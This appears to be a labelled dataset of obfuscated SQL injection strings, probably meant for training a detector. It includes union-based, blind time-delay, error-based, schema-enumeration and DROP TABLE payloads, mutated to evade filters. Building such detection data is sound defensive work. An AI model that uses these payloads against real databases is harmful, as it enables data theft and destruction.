"%27%20UNION%20SELECT%201%2C2%2C3/**/OR/**/(1)--", 1
"1'/*!12345*/&&/**/(1=1)substring(database(),/**/1,/**/1)/**/=/**/'s'/**/--", 1
";%09SELECT%09pg_sleep(5);%09%u0020&&%u0020%u0027a%u0027=%u0027a%u0027--", 1
"%27AND1%3Dconvert(int,@@version)/*%0d%0a*/AND%27a%27%3D%27a%27--", 1
"", 1
"test'/*!12345*/OR'1'='1'----ttfx3ync2swj%0d%0a", 1
"test'/*!12345*/OR/**/'1'='1'/**//*", 1
"'UNioNsElEctNULl,NUlL,nulL#/*%0d%0A*/MorE_NOIsE--/*%0D%0a*/", 1
"%2%37%20unIon%20SElEcT%201%2%632%2%433--", 1
"admin' || '1'='1 /*!*/AND 1=1", 1
"'AND", 1
"1=1--/*%0a*/", 1
"'OR'1'='1%0a--random_noise", 1
"1'/**/UNION/**/SELECT%2f**/ta%62le_name,/%2a%2a/nul%6c,/**/null/**/FROM%2f**/%69nf%6frmatio%6e_sc%68ema.tables/**/--", 1
"'%20OR '1'<=%271", 1
"; DROP TABLE users; ----t3u4vq2r1p1lhe0", 1
"; sELEcT Pg_slEeP(5); ----6ISmZ961W", 1
"' or EXisTS(sEleCt 1 FROm UseRs)--", 1
"1%u0027%u0020Or%u0020IF(suBsTrInG(DATaBasE(),%u00201,%u00201)<=%u0027a%u0027,%u0020SLEeP(5),%u00200)%u0020--", 1
"'			OR			EXISTS(SELECT			1			FROM			users)--", 1
"1)/**/UNIONSELECT%0d%0a1,database(),3--/*%0d%0a*/", 1
"1aNd", 1
"1=1/*%0a*/", 1
"test' || (1=1)'1'>='1' /*#c37or", 1
"admin'OR/*%0d%0a*/'1'>='1", 1
"test%27/*!*/OR%20%271%27%3D%271%27%20/*#2h8h7s", 1
"admin'/*!*/OR	'1'%20=	'1 OR (1)", 1
";/*!12345*/SelECT Pg_Sleep(5); --#e6czbjl0is1or", 1
"1%27UNION%250d%250aSELECTtable_name%2Cnull%2C%2F%2A%250a%2A%2Fnull%0AFROMinformation_schema.tables--", 1
"1))%20UN/**/ION%20SELECT%201,database(),3--", 1
"admin%27%20O/**/R%20%271%27%3D%271", 1
"1%29%29UNION%250d%250aSELECT%250d%250a1%2Cdatabase%28%29%2C3--", 1
"1%27%20OR%20IF%28substring%28database%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20 -- random_noise--", 1
"1%27UNION%0d%0aSELECTtable_name,null,/*%0a*/nullFROMinformation_schema.tables/*%0d%0a*/AND%27a%27%3D%27a%27--", 1
"%2527%2520%2520%2520%2520OR%2520%2520%2520%25201%2520%253D%25201%2520%2520%2520%2520--%2520%2520%2520%2520", 1
"test'/**/OR		'1'	=	'1'		/*", 1
"1AND%0a1=1", 1
"", 1
"1) UNION SELECT 1,database(),3----56n5lixc", 1
"%u0027%u0020UNION%u0020SELECT%u0020null,%u0020null,%u0020null%u0020%u0020--%u0020random_noise--%u0020", 1
"%27%20and%201%3DconVerT%28iNT%2C%40%40vERsion%29--", 1
"'OREXISTS(SELECT/*%0d%0a*/1FROM", 1
"users)--", 1
"", 1
";					DROP					TABLE					users;										OR					(1)--", 1
"' AND extractvalue(1,concat(0x5c,version()))----4t6nykf8nk5o", 1
"%27%09%09%09A/*!12345*/ND%09%09%091IN%09%09%09(1)1%09%09%09-%2d%09%09%09", 1
"%27%20U%4eION%20SEL%45CT%2%301,2,3--", 1
"' && (1=1)1LIKE1  -- random_noise--", 1
"'OREXISTS(SELECT1", 1
"FROMusers)--#4szgsja3", 1
"%27%20AND%201%3D1%20 AND 'a'='a'--%20", 1
"%27OREXISTS(SEL/*!12345*/ECT1FROM", 1
"users)--/*%0a*/", 1
"' OR EXISTS(SELECT 1 FROM users) # more_noise--", 1
"' OR '1'>='1", 1
"1'/*!12345*/oR     aSCiI(sUbstRING(DATabAsE(),     1,     1))     >     100     --", 1
"1%u0020aND%u00201%3d1", 1
"1%27%%320A%4eD%20substring%28database%28%29%2C%%320%31%2C%2%301%29%20%3D%20%27s%2%37%20-%2d", 1
";/*!*/  DROP   TABLE   users;   --", 1
"1 anD 1=1", 1
"1%27%20oR%20If%28SUbSTRInG%28daTAbase%28%29%2C%201%2C%201%29%3D%27a%27%2C%20SLEEp%285%29%2C%200%29%20--", 1
"WAITFORDELAY/*%0d%0a*/'0:0:5'----zkqm191ua6698t/*%0d%0a*/", 1
"tes%74%u0027%u002%30OR%u0020%u0027%31%u0027%3d%u00271%u0027%%750%3020/*", 1
"1%27%20UNI%4fN%2%30SELECT%20table%5fname,%20%6eul%6c,%20nul%6c%20FROM%20informatio%6e_%73chema.t%61bles%20--", 1
"'/*!12345*/or1=1%0d%0a--%0d%0a%0d%0a", 1
"1))UNION/*%0a*/SELECT%0a1,database(),3 AND 'a'='a'--", 1
"admin'/**/XOR/**/'1'='1", 1
"tes%74' O%52 '1'%3d'1' --", 1
"1%u0027%u0020oR%U0020IF(subsTrING(DAtaBASE(),%U00201,%u00201)%3D%u0027A%U0027,%u0020SLeEp(5),%u00200)%U0020--", 1
"WAITFOR%20DELAY%20%270:0:5%27--#3tg234ijdwk8d", 1
"1%u0027%u0020&&%u0020(1=1)substriNG(DATABAse(),%u00201,%u00201)%u0020=%u0020%u0027S%u0027%u0020--", 1
"%27%20AND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29%u0020OR%u0020%u0027b%u0027=%u0027b%u0027--", 1
";%u0020DROP%u0020TABLE%u0020users;%u0020 /*!*/AND 1=1--", 1
"1%27UNIONSELECTtable_name%2C%250d%250anull%2CnullFROMinformation_schema.tables--%2F%2A%250d%250a%2A%2F", 1
"%u0027%u0020OR%u0020EXISTS(SELECT%u00201%u0020FROM%u0020users)%u0020OR%u0020%u0027b%u0027LIKE%u0027b%u0027--", 1
"1/**/AND/**/1=1 /*!*/AND 1=1", 1
"%3B%20SELECT%%320%70g_slee%70%%3285%29%3B%20 -- r%61ndom_noise--", 1
"' UN%49On seL%65cT 1,2,3%2d-#yex7922wcioy3b", 1
"1%29%20U%254eIO%254e%20SELE%2543T%201%2Cda%2574abase%28%29%2C3%20%2F%2A%21%2A%2FAND%201%3D1--%236czqeuf6t0i1t", 1
"%27%%320%4fR%20EXISTS(%53ELECT%201%%320FROM%20users)-%2d", 1
"'				A/*!12345*/ND				extractvalue(1,concat(0x5c,version()))--", 1
"Te%53T%27%20O%52%20%271%27%3d%271%%327%20%2d-%20", 1
"1%u0027%U0020aNd%u0020suBStriNG(DataBASe(),%U00201,%U00201)%u0020=%U0020%u0027s%u0027%U0020/**/or/**/(1)--", 1
"1%27%2F%2a%2A%2For%2f%2a%2a%2fIf%28suBStRING%28dATaBASE%28%29%2c%2f%2A%2a%2f1%2C%2F%2A%2a%2f1%29%3d%27a%27%2C%2f%2a%2A%2fslEeP%285%29%2C%2F%2A%2A%2f0%29%2F%2A%2A%2F--", 1
"%3B%2520SELECT%2520pg_sleep%285%29%3B%2520--", 1
"1 AND%201LIKE1 -- random_noise", 1
"%27%20AND%201%3D1%20--%20--3rhjjly", 1
"t%65st%2%37%20OR%20%271%%327%3D%%3271%27%20--%20", 1
"%27/*!*/OR%20%271%27IN%20(1)%271", 1
"%25u0027%2F%2A%2112345%2A%2F%2541%254eD%25u00201%3D1%25u0020%252d-%25u0020", 1
"'        OR        '1'	=  '1--6gv520pgf", 1
"'/*!*/|| ExistS(SELeCT 1 FROM UsERs)--", 1
"%u0027%u0020AND%u0020extractvalue(1,concat(0x5c,version()))--#skbs57iggaml7jj", 1
"%u0027%U0020UNion%U0020sEleCt%U0020NUll,%U0020NUlL,%U0020null%u0020%u0020--%U0020rAnDoM_NOisE--%u0020--n9y5rkoNg5EMP", 1
"1/**/aNd/**/1=1", 1
"WAITFOR/*!*/DELAY          '0:0:5'--", 1
"%3B%2520DROP%2520TABLE%2520users%3B%2520%2520%23%2520more_noise--", 1
"1' OR IF(subst%72%69ng(database(), 1, 1)='%61',%20SLEEP(5), %30)  %2d%2d random_no%69se--#8mghqauo4woyza", 1
"'/**/OR/**/1>%20=%201/**//**/--/**/random_noise--/**/", 1
"%u0027UnIOn", 1
"seLECT", 1
"1,2,3--", 1
"", 1
"'%20AND%201%20>=%091%20--%20--i59jza91nwh9", 1
"'oR", 1
"'1'LIKE'1/*%0d%0A*/", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020AND%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0020%u0027a%u0027%20=%20%u0027a%u0027--%20", 1
"WAITFO/**/RDELAY/*%0a*/'0:0:5'----htamoetnxh91%0d%0a", 1
"%u0027%u0020OR%u0020%u00271%u0027%20=%09%u00271%u0020/*!*/AND%u00201%20=%091", 1
"%27a%2F%2A%2112345%2A%2FnD%250D%250aeXTraCtvaLUe%281%2CcoNcat%280x5C%2CVeRsIon%28%29%29%29--%2F%2A%250D%250A%2A%2F", 1
"%2527%2520UNION%2520S%2545LECT%25201%2C%2532%252c3--", 1
"'U%4eION%20SELEC%54/*%0a*/1,2,3--#4dqmiwsw2l%69", 1
"; DroP table UseRs; --", 1
"1' UNION SELECT table_name, null, null FROM information_schema.tables --#5jlj86czcdse3j", 1
"%27%20OR%20%271%27%3d%271--2onk30f", 1
"%27	OR	'1'	=%09%271", 1
"1%u0020AND%u00201>=1 OR (1)", 1
"' UNION SE%4cECT n%75ll, nu%6cl, null --%20", 1
"teST'/**/or/**/'1'	=%09'1'/**/--/**/", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#3w1mr0ys2", 1
"1%27%20AND%20substring%28database%28%29%2C%201%2C%201%29%20%3D%20%27s%27%20/**//*!*/AND/**/1%09=	1--", 1
";%u0020SELECT%u0020pg_sleep(5);%u0020----pbaxzpxytvo", 1
"1%u0027/**/OR/**/IF(substring(database(),/**/1,/**/1)LIKE%u0027a%u0027,/**/SLEEP(5),/**/0)/**/--", 1
"'/**/Or/**/'1'In/**/(1)'1", 1
"' AND 1=1 -- #pgftrhhpbz9", 1
"%2527%20UNION%20SE%254cECT%201%2C2%2C3%252d-", 1
"1%27%20AND%20suBSTriNg(DaTAbasE(),%201,%201)%20%3C%3D%20%27s%27%20--", 1
"' XOR 1=1 -- #e4apynoiq86r", 1
"' and 1=1 --", 1
"' oR exists(SEleCT 1 from usErS)--", 1
"test%2527%2F%2A%2A%2FOR%2520%25271%2527%253D%25271%2527%2520--%2520", 1
"admin' OR '1'IN (1)'1", 1
"'%2f**/AND 1=1 -%2d", 1
"tEsT'/**/Or/**/'1'='1'/**//*/**/#/**/more_noise", 1
"1)  UNION  SELECT  1,database(),3----aid1msh9cbf4z9n", 1
"'/**/AND/**/1 =	convert(int,@@version)--", 1
"%3B%20SELECT%20pg_sleep%285%29%3B%20----vytr5b0x", 1
"1' ANd SUbsTRInG(dATabASe(), 1, 1) = 's' --", 1
"%27%2520%2520Or%2520%25201%20%20%3D%201%2520%2520%20%2F%2A%21%2A%2FAND%201%3D1--%2520%2520", 1
"1%27%20%20%20%7C%7C%20%20%20ascii%28substring%28database%28%29%2C%20%20%201%2C%20%20%201%29%29%20%20%20%3E%20%20%20100%20%20%20--", 1
"%u0027/**/AND/**/1=convert(int,@@version)--", 1
"test'/*!*/OR '1'LIKE'1' --", 1
"1'/**/OR/**/ascii(substring(database(),/**/1,/**/1))/**/>/**/100/**/--#noofwdsq9me7ie", 1
"%31%u0027%u0020A%4eD%U0020subst%72iNG%28DATaBasE(),%U00201,%U0020%31)%U0020=%U0020%u0027S%27%U0020--#Vcqj3D5C", 1
";%u0020SELECT%u0020pg_sl%65ep(%35);%u0020%2d-", 1
"1%U0027%%750020UNION%u002%30SElecT%u0020tabLE_n%41mE,%u0020NULL%2c%U0020NuL%6c%u0020f%72om%u0%3020iN%46ORMATI%6fN_sCheMa%2eTaBleS%u0%3020--", 1
"'/**/&&1IN", 1
"(1)convert(int,@@version)--/*%0a*/", 1
"%27%2520A/*!*/ND%25201%2520IN%20%281%29%25201%2520--%2520", 1
"%27%2F%2A%2A%2FAND%2F%2A%2A%2Fextractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"1'AND%0d%0asubstring(database(),%0d%0a1,1)", 1
"='s'--", 1
"test'/*!12345*/OR '1'	=%20'1' /* # more_noise--odr9z2gjgwul", 1
"1'ORascii(substring(database(),1,1))>/*%0d%0a*/100--%0d%0arandom_noise----w2ai5s83r", 1
"test%u0027O/*!12345*/R%0d%0a%u00271%u0027=%u00271%u0027%0a/*%0a", 1
"'UNIONSELECTnull,null,null#more_noise--%0d%0a", 1
"1'ORIF(substring(database(),1,1)LIKE'a',/*%0d%0a*/SLEEP(5),0)--", 1
"1)%u0020UNION%u0020SELECT%u00201,database(),3----4l7bo5vk", 1
"1' || (1=1)ASCIi(suBsTriNG(dATAbASE(), 1, 1)) > 100 --", 1
"1)%20UNION%20SELECT%201,database(),3--#fxhw5q", 1
"%27%2F%2A%21%2A%2FOR%20%20%20%20%20%20EXISTS%28SELECT%20%20%20%20%20%201%20%20%20%20%20%20FROM%20%20%20%20%20%20users%29--", 1
"' OR EXISTs(sELEct 1 fRoM UsErs) # mOre_NOise--", 1
"%u0027OR%u00271%u0027LIKE%u00271/*%0d%0a*/", 1
"'/*!*/AND/**/1=1/**/--/**/", 1
"%u0027%u0020OR%u00201<=1%u0020--%u0020", 1
"1%27%20or%20if%2528s%2575B%2573Tring%28DATAbaSe%2528%29%2C%201%2C%25201%29%3D%2527a%27%2C%20SLEEp%285%29%2C%200%29%20 /*!*/AND 1=1--", 1
"%25u0027%25u0020OR%25u0020%25u00271%25u0027%3D%25u00271", 1
"1)/**/UNION SELECT 1,database(),3 # more_noise--", 1
"1%27%20oR%20If(SuBSTrING(DATABAsE(),%201,%201)%3D%27A%27,%20slEEP(5),%200)%20 /*!*/AND 1=1----5y2gf", 1
"%27/**/OR%20EXISTS(SELECT%201%20FROM%20users)--", 1
"%27or%0aexiStS%28sELEct1frOMUseRS%29--%250A", 1
"' || (1=1)1=1 -- #11t00gkam82atv", 1
"1	AND	1	= 1", 1
"'UNIONSELECT/*%0a*/null,%0d%0anull,null%0a--", 1
"1%u0027OrASCiI(SUbsTRinG(dATABASE(),/*%0d%0a*/1,1))>%0a100----i4QBuq", 1
"1%27%20O/**/R%20ascii(substring(database(),%201,%201))%20%3E%20100%20--#x2zgz", 1
"1'/**/||/**/IF(su%62string(data%62ase%28),/**/1,/**/1)%3d'a',/**/%53LEEP(5),/**/%30)/**/--", 1
"1' AnD SUBstrInG(datABasE(), 1, 1) = 's' --", 1
"1%27%20UNION%20SELECT%20table_name%2C%20null%2C%20null%20FROM%20information_schema.tables%20%20OR%20%27b%27%3D%27b%27----0hl6whc", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 --#4ulj9", 1
"%%33B%20D%52OP%20TABLE%20user%73%3B%20--", 1
"%27/**/UNION/**/SELECT/**/null,/**/null,/**/null/**//**/AND/**/%27a%27%3D%27a%27--/**/", 1
"%27%20A/**/ND%20extractvalue%281%2Cconcat%280x5c%2Cversion%28%29%29%29--", 1
"; DROP %54ABLE%20%75sers; --", 1
"WAITFO/*!12345*/R%u0020DELAY%u0020%u00270:0:5%u0027--", 1
"%27OR", 1
"%271%27%3D%271 OR 'b'='b'", 1
"'UNIONSELECT1,2,3--/*%0a*/", 1
"%27%20Or%20%271%27%3d%271", 1
"adMiN%27%20Or%20%271%27%3d%271", 1
"test'/**/OR%09%09%09%09%09'1'%09=%20'1'%09%09%09%09%09/*#n8yaxzmzxzpm1kk", 1
"' UNION SELECT 1,2,3 OR 'b'='b'--", 1
"%27%20UNION%20SELECT%20null%2C%20null%2C%20null%20--%20--y10ht", 1
"1%27/**/OR/**/IF(substring(database(),/**/1,/**/1)%3D%27a%27,/**/SLEEP(5),/**/0)/**/----x1yioot38stmm", 1
"1'ANDsubstring(database(),%0d%0a1,1)='s'/*%0a*/--", 1
"1%2527%20OR%20I%2546%28su%2562string%2528database%28%29%252c%201%252c%201%29%3D%27a%27%2C%20SLEEP%285%29%2C%200%29%20--", 1
"%3B%20%2544ROP%20%2554ABLE%20users%253b%20--", 1
"1%27%20oR%20AScII(SUBSTRINg(daTABasE(),%201,%201))%20%3e%20100%20--", 1
";/**/droP%u0020tABle%u0020USeRS;%u0020--#jttlzarg9xt5az", 1
"'/*!12345*/OR EXISTS(SELECT 1 FROM users) -- random_noise--", 1
"%27%20OR%20EXISTS(SELECT%201%20FROM%20users)/**/--/**/random_noise--", 1
"WaitFor/**/DELaY/**/'0:0:5'--#vueuGNe42wi", 1
"WAITFOR/**/DELAY'0:0:5'----0gjeo85/*%0a*/", 1
"1'/**/OR/**/IF(substring(database(),/**/1,/**/1)LIKE'a',/**/SLEEP(5),/**/0)/**/----930yv6zvgqu8", 1
"'/**/oR 1=1 --", 1
"'/**/UN/*!*/ION/**/SELECT/**/1,2,3--", 1
"1'/**/or/**/aSCIi(SuBSTrIng(dAtabaSE(),/**/1,/**/1))/**/>/**/100/**//**/oR/**/(1)--", 1
"1%27 OR %61scii(substring(datab%61se%28), 1, %31)) > 100 --", 1
"1%u0027%u0020AND%u0020substring(database(),%u00201,%u00201)%u0020=%u0020%u0027s%u0027%u0020--", 1
"WAITFOR/**/DELAY/**/%u00270:0:5%u0027 /*!*/AND 1=1--", 1
"1'oRAScIi(SUBstriNg(daTAbase(),1,/*%0d%0a*/1))>", 1
"100%0a--", 1
"%27%20OR%20EXISTS%28SELECT%201%20FROM%20users%29 /*!*/AND 1=1--", 1
"aDMin' || '1'='1", 1
"test' OR '1'='1' /* AND 'a'='a'", 1
"'AnD/*%0a*/1%20=%09cOnVeRT(INt,@@verSiON) -- raNdoM_NOiSe--%0a", 1
"%27%2f%2a%2A%2FAnD%201%3d1%20--%20", 1
";/**/DROP%20TABLE/**/use%72s%3b/**/----mh78h", 1
"%u0027%u0020UNiOn%u0020SELEct%u00201,2,3--", 1
"' UNION SELECT n%75%6cl, null,%20n%75ll --", 1
"%3B%2520sElecT%2520pg_sLeep%285%29%3b%2520--", 1
"' aND 1=conVeRt(iNT,@@vERSion)----RgUOlDtt", 1
"'/**/or/**/1=1/**/ aNd 'A'='a'--/**/", 1
"%27%20and extRacTV%61lu%65(1,cONcaT(0x5C,versIO%6e())) Or 'B' =%09'b'--", 1
"'AND1=1%0d%0a--", 1
"", 1
"'        ||        (1%09= 1)EXISTS(SELECT        1        FROM        users)--", 1
"'OR/*%0a*/'1'='1--jttw7", 1
"%27/**/AND/**/1%3D1/**/--/**/", 1
"1%27%2%30UNION%20%53ELECT%20table_na%6de%2C%20null%2C%20n%75ll%20FROM%20inf%6fr%6dati%6f%6e_schema.table%73%20 AND 'a'='a'-%2d", 1
";DROP%0%64%0aTA%42LEusers%3b--", 1
"'%20Uni%4fN SElECt 1,2%2c%33 # MOre_Noise--", 1
"; DROP TABLE users;  # more_noise--", 1
"test%u0027%u0%3020OR%u0%3020%u00271%%750027=%u00271%%750027%%75%30020--%u0020", 1
"%3B%20SEL/**/ECT%20pg_sleep%285%29%3B%20--", 1
"test' || '1'='1' --", 1
"'/*!12345*/&&(1IN%0a(1)1)1=convert(int,@@version)--%0a", 1
"test%27OR%2F%2A%250d%250a%2A%2F%271%27%3D%271%27%250d%250a--random_noise--%0A", 1
"1' Or aSC%69I(%73UbStRinG(DaTabASe()%2C 1, 1%29) > 100%20--", 1
"admin%u0027%u0020O/*!12345*/R%u0020%u00271%u0027=%u00271", 1
"'/**/OR/**/1 = 1/**/--/**/", 1
"'%2f**/AND/**/1%20=	convert(int,%40@%76ersio%6e%29--", 1
"1' O%52 ascii(substri%6eg(d%61tabase(), 1,%201)) > 1%300 --", 1
"1))%20UNION%20SELECT%201,database(),3 -- random_noise--", 1
"1))/*!*/       UNION        SELECT        1,database(),3--", 1
"; SE%4cECT %70g_sleep(5);  OR%20'b'='b'%2d-", 1
"'        UNION        SELECT        1,2,3--", 1
";/*!12345*/selecT pG_sleEP(5); --", 1
"test%27OR%271%27%3D%271%27%20AND%20%27a%27%3D%27a%27--/*%0d%0a*/", 1
"'%20%20%20%20UN/*!12345*/ION%20%20%20%20SELECT%20%20%20%20null,%20%20%20%20null,%20%20%20%20null%20%20%20%20--%20%20%20%20", 1
"%27AND%250d%250a1%3C%3Dconvert%28int%2C%40%40version%29 /*!*/AND 1=1--%250a", 1
"1' AN%44%20substrin%67(data%62a%73e(), 1, 1) = 's' --", 1
"%27%20oR%20%271%27%3D%271", 1
"1)%U0020UNIon%u0020seleCt%u00201,databaSe(),3--", 1
"'/*!12345*/OR '1'='1 # more_noise", 1
"1'/**/anD/**/sUbSTRIng(dataBaSE(),/**/1,/**/1)/**/iN/**/(1)/**/'S'/**/--", 1
"1%27%20OR%20ascii%28substring%28database%28%29%2C%201%2C%201%29%29%20%3E%20100%20%20%23%20more_noise--%23v3e26qbls", 1
"1%29%20UNION%2%30%53EL%45CT%2%301%2Cdatabase%28%29%2C3-%2d", 1
";					SEL/**/ECT					pg_sleep(5);										#					more_noise--", 1
"%27OR1%3D1/*%0d%0a*/--", 1
"ADMIn'Or'1'='1/*%0a*/", 1
"1'ANDsubstr%69ng(database()%2c%0a1,1)=/*%0a*%2f's%27%2d-", 1
"1%u0027%u0020uNIon%u0020sELeCt%u0020TAble_naMe,%u0020nuLl,%u0020nuLl%u0020fRoM%u0020INFORMaTiOn_ScHemA.TABles%u0020--", 1
"WA%2549TFOR%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A%2535%27%252d-%20AND%20%27a%27%3D%27a%27", 1
";%u0020DROP%20TABLE%u0020use%72%73;%u0020--", 1
"WaitfOrDelaY%0d%0a%270:0:5%27--", 1
";/**/SeleCT/**/PG_slEEp(5);/**/--", 1
"1%27orIf%28sUBSTrINg%28dataBaSE%28%29%2C1%2C1%29%3D%27A%27%2CSlEep%285%29%2C0%29%2F%2A%250a%2A%2F%250d%250aOR%27b%27%3D%27b%27--", 1
"%u0027%u0020AND%u00201/**//**/=	convert(int,@@version)--", 1
"1'OR", 1
"IF(substring(database(),%0d%0a1,1)='a',", 1
"SLEEP(5),0)--", 1
"%27%2F%2A%2A%2FOR%2F%2A%2A%2FEXISTS%28SELECT%2F%2A%2A%2F1%2F%2A%2A%2FFROM%2F%2A%2A%2Fusers%29--", 1
"1' OR ascii(substring(database(), 1, 1)) > 100 ----ucbh6orgbccz2", 1
"%27/*!12345*/o%72 e%58IsTS(se%4ceCt 1 f%72om USErS) OR (1)--", 1
"%u0027%u0020AND%u0020extractvalue(1,c%6f%6eca%74(0x5c%2cversi%6fn()))--", 1
"' AND ExtrACTValuE(1,cONCAT(0x5c,vErSiOn()))--", 1
"1/**/&&/**/1>=1", 1
"WAITFoR%u0020delAY%U0020%u00270:0:5%U0027--#cbK4225XGv90rI5", 1
"WaitfOr%20dELAy%20%270:0:5%27--#25mVu8jN3I", 1
"%u0027%u0020UNIO%4e%u0020SE%4cECT%u0020%6eull,%u0020null,%u0020nu%6cl%u0020--%u0020", 1
"1' UnioN selECt tAbLe_NAMe, nuLl, nULL FROm INFormaTioN_SchEmA.tabLeS --#iuGlSH", 1
"TeST%27%20OR%20%271%27%3D%271%27%20%2F%2A--xiv2ot7cm", 1
"' %55NION SELECT null, n%75ll%2c null -- #xaijg%6b%67ydnlsr%67", 1
"Test' OR '1'='1' /* or 'b'='B'", 1
"'%41ND%0d%0a%65xtractvalue%281,con%63at(0x5c,version()))%2d-", 1
"%u0027%u0020O/**/R%u00201<=1%u0020--%u0020", 1
"1%27%20UN/*!12345*/ION%20SELECT%20table_name,%20null,%20null%20FROM%20information_schema.tables%20--#c499uk3sx1yo", 1
"1'/**/AND substring(database(), 1, 1) = 's'  OR 'b'='b'--", 1
"' OR '1'='1 /*!*/And 1=1", 1
"1)/**/UNION%20SELECT%201,database(),3%20AND%20%27a%27%3D%27a%27--", 1
"'/**//**//**//**/UNION/**//**//**//**/SELECT/**//**//**//**/1,2,3--", 1
"%u0027%u0020AND%u0020%31=1%20--%u0020", 1
"%u0027%u0020AnD%u00201%20=%20convErt(INT,@@VErsiON)--", 1
"%27/*!*/UNION%20%20%20%20%20%20%20%20SELECT%20%20%20%20%20%20%20%201,2,3--", 1
"'AND/*%0a*/1> =%20%63%6fnvert(%69%6et,@@version)--%0d%0a", 1
"'%09%09%09AND%09%09%091%09=	1%09%09%09--%09%09%09", 1
"1'ANDsubstring(database(),1,", 1
"1)IN (1)'s' OR 'b'='b'----u6ey77ep7k7jn", 1
"%41%64miN%u0027/**/or%u0020%u00271%u0027=%u00271", 1
"' XoR 1=1 -- --p4if2l", 1
"%27/*!12345*/&&%20(1%3D1)1%3D1%20--%20", 1
"' union sELeCt 1,2,3--", 1
"%u0027%u0020UN%2f*!1%32345*/ION%u0020SELECT%u00201%2c2,%33-%2d", 1
"' U%4eION SE%4cECT 1,%32,3 -- random_noise--", 1
"%31%27%20U%4eIoN%20SElEc%54%20taBLe_nAme%2C%20n%75ll%2C%%320nuLl%20fROm%20inFoRMat%69ON_sc%68EmA.TAB%4ces%20%2d-", 1
"%27/**/UNION/**/SELECT/**/null,/**/null,/**/null/**//**/OR/**/%27b%27%3D%27b%27--/**/--xwyyq0nmx2od5u", 1
"1%27%20OR%20aScIi(subSTRINg(DAtABaSe(),%201,%201))%20%3E%20100%20--", 1
"' OR eXistS(seleCT 1 From UseRS) AND 'a'='a'--", 1
"test' XOR '1'='1' /*", 1
"test'%20%20%20%20%2%30||%20%20%20%20%%320(%31  =%201)'1'  =%%32%30'1'%20%20%20%20%20%2f%2a # m%6fre_noise", 1
"1)UNION", 1
"SEL%45CT/*%0d%%30a*/1,database(%29%2c3--", 1
"1' OR IF(substring(database(), 1, 1)='a', SLEEP(5), 0)  AND 'a'='a'--", 1
"'AND/*%0a*/1>=convert(int,@@version)--/*%0d%0a*/", 1
"%u0027%u0020OR%u00201=1%u0020/**/OR/**/(1)--%u0020--y1e27y61a5tw", 1
"%27%20and%201%3DCoNvERt(INt,@@veRSioN)%20AND%20%27a%27%3D%27a%27--", 1
"1))    UNION  %20 SELECT    1,%64atabas%65%28),3-%2d", 1
"1) uNion selECt 1,datABaSE(),3--", 1
"W%41IT%46OR DELAY '0:0:5'%2d-", 1
"'				AND				1	=/*!*/ convert(int,@@version)--", 1
"'/**/UNIO%4e/**/SELECT/**/null,/**/null,%2f*%2a/n%75%6cl/**/--/*%2a/", 1
"1%25u0027%25u0020OR%25u0020IF%28substring%28database%28%29%2C%25u00201%2C%25u00201%29%3D%25u0027a%25u0027%2C%25u0020SLEEP%285%29%2C%25u00200%29%25u0020--", 1
"AdMin%27%20oR%20%271%27%3D%271", 1
"teST%27O%52'1'='1'", 1
"/*%0a", 1
"'AND1=1--%0a", 1
"ad%6dIn%u0027%20OR%U0020%U00271%u0027=%u00271", 1
"1'/**/aND/**/%73uBSTriNg(%64%61tABasE(),%201,/**/1)/**/=/**/'%73'/**/--", 1
"' OR 1=1  -- random_noise-- --6w8i95sfdgbo3g9", 1
"%27%2F%2A%21%2%41%2FOR%2%301%3D1%20--%2%30", 1
"%27%20AND%201%3D1%2%30-%2d%20", 1
"1'        AND        substring(database(),        1,        1)        %20=	        's'        --", 1
"1%u0027%u0020%4fR%u0020if(SUBs%74R%69ng(%64A%74ABAsE(),%u00201,%u00201)%3d%u0027a%u0027,%u0020SLeEP(5),%u00200)%u0020--", 1
"%u0027%u0020AND%u0020extractvalue(1,concat(0x5c,version()))--#h4vc40rqezc", 1
"1AND%0d%0a1%3D1", 1
"1)%55NION", 1
"SE%4cEC%54%0d%0a1,database(),3%2d-", 1
"", 1
"test'%20%20||%20%20'1'	=  '1'%20%20--%20%20", 1
";DROPTABLE%0ausers;%0a--/*%0a*/", 1
"1/*!12345*/ AND  1 IN (1) 1", 1
"1))%20UNION%20SELECT%201,database(),3----7jl5ju0", 1
"%27/**/O/*!12345*/R/**/1%3D1/**/--/**/", 1
"WAI%2554FO/*!*/R%2F%2A%2A%2FDELAY%2F%2A%2A%2F%270%3A0%3A%2535%2527--", 1
"'AND%0a1>=convert(int,@@version)----qw1jm/*%0a*/", 1
"%27%20unioN%20sEleCT%201%2C2%2C3--", 1
"' UNION SELECT null, null, null  # more_noise--", 1
"%27%20AND%20extractvalue(1,concat(0x5c,version()))%20/*!*/AND%201%3D1--", 1
"admin%u0027%u0020O/*!*/R%u0020%u00271%u0027%3D%u00271", 1
";/*!12%3345*/DROP%2f**/TA%42LE%2f**/%75sers;/**/--", 1
"'/*!*/oR'1'  = '1", 1
"", 1
"test'OR", 1
"'1'='1'%0a/*/*%0a*/", 1
"te%73t'OR/*%0a*/'%31%27='1'", 1
"--%0d%0a", 1
"'/**/OR 1=1 --", 1
"%27%20A/*!12345*/ND%20extractvalue(1,concat(0x5c,version()))--", 1
"'U%4eIO%4e", 1
"SE%4cECTnull,null,nul%6c -- random_nois%65--", 1
"%27%20O/*!12345*/R%20%271%27%3D%271", 1
"adm%69n'/**/OR%2f**/'1'=%27%31 /*!*/AND 1=1--ynv13svhhi", 1
"' && %31>=conver%74(i%6et,@@versio%6e) OR 'b'='b'--", 1
"admin' OR '1'LIKE'1", 1
"1'/*!12345*/OR I%46(s%75b%73tring(databa%73e(), 1, 1)='%61', SLEEP(5), 0)%20%2d-", 1
"'OR1 =	1", 1
"--", 1
"' And 1=COnvERt(iNt,@@verSIon)--", 1
"admIn'%09%09%09%09%09Or%09%09%09%09%09'1'	=%09'1", 1
"%27%20%%320%20%4fR%20%20%20%271%%327%20%20%3D%20%20%2%371", 1
"%u0027%u0020uNiON%u0020SElEct%u0020NULl,%u0020nUlL,%u0020nULL%u0020--%u0020", 1
